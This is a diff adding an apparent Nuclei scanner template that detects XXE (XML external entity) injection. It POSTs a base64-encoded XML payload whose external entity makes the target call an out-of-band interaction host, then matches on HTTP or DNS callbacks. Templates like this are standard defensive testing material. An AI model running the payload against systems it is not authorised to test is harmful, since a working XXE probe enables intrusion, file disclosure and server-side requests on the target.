@@ -1,0 +1,27 @@
+id: basic-xxe-base64
+
+info:
+  name: XXE SAML
+  author: reewardius
+  severity: high
+  tags: xxe,generic
+  
+variables:
+  payload: '<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://{{interactsh-url}}/x"> %ext;]><r></r>'
+  
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        {{base64(payload)}}
+        
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
